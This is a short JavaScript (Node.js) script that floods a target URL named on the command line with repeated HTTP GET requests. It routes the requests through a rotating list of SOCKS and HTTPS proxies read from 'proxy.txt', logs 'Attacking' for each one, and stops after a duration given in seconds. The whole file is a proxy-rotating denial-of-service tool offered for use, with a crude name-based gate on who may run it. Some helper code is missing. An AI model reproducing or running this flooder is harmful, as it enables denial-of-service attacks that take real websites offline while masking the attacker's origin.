const fs = require('fs');
const axios = require('axios');
const SocksProxyAgent = require('socks-proxy-agent');
const HttpsProxyAgent = require('https-proxy-agent');

const userIP = 'PermenMD';
const targetUrl = process.argv[2];
const proxyListFile = 'proxy.txt';
const totalRequests = 5000;
const delay = 10;

function readProxyList() {
  try {
    const data = fs.readFileSync(proxyListFile, 'utf8');
    const lines = data.trim().split('\n');
    return lines.map(line => line.trim());
  } catch (error) {
    console.error(`Gagal membaca daftar proxy: ${error}`);
    return [];
  }
}

function sendRequest(target, agent, userIP) {
  if (allowedIPs.includes(userIP)) {
    axios.get(target, { httpAgent: agent })
      .then((response) => {
        console.log(`Attacking ${target}`);
      })
      .catch((error) => {
        console.error(`Attacking ${target}`);
      });
  } else {
    console.error(`IP Mu Tidak Terdaftar`);
  }
}

function sendRequests() {
  const proxyList = readProxyList();
  let currentIndex = 0;

  function sendRequestUsingNextProxy() {
    if (currentIndex < proxyList.length) {
      const proxyUrl = proxyList[currentIndex];

      let agent;

      if (proxyUrl.startsWith('socks4') || proxyUrl.startsWith('socks5')) {
        agent = new SocksProxyAgent(proxyUrl);
      } else if (proxyUrl.startsWith('https')) {
        agent = new HttpsProxyAgent({ protocol: 'http', ...parseProxyUrl(proxyUrl) });
      }

      sendRequest(targetUrl, agent, userIP);
      currentIndex++;
      setTimeout(sendRequestUsingNextProxy, 0);
    } else {
      setTimeout(sendRequests, delay);
    }
  }

  sendRequestUsingNextProxy();
}
const allowedIPs = ['PermenMD'];
const KillScript = () => process.exit(1);

setTimeout(KillScript, process.argv[3] * 1000);

sendRequests();

